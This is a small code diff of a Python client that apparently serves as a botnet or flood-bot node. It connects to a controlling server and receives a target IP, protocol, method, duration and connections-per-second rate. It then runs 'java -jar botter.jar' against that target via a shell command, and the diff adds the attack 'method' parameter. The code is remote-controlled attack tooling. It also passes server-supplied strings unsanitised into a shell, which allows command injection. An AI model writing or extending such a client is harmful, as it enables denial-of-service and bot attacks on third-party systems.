@@ -21,8 +21,8 @@ def connect_to_server(server_host, server_port):
     print(f"Connected to the server at {server_host}:{server_port}")
     client_socket.send(client_name.encode('utf-8'))
 
-    target_ip, protocol, seconds, cps = client_socket.recv(1024).decode('utf-8').split("??<><>")
-    command = f"java -jar botter.jar {target_ip} {protocol} {seconds} {cps}"
+    target_ip, protocol, method, seconds, cps = client_socket.recv(1024).decode('utf-8').split("??<><>")
+    command = f"java -jar botter.jar {target_ip} {protocol} {method} {seconds} {cps}"
     print(command)
     subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     client_socket.send("!!".encode('utf-8'))
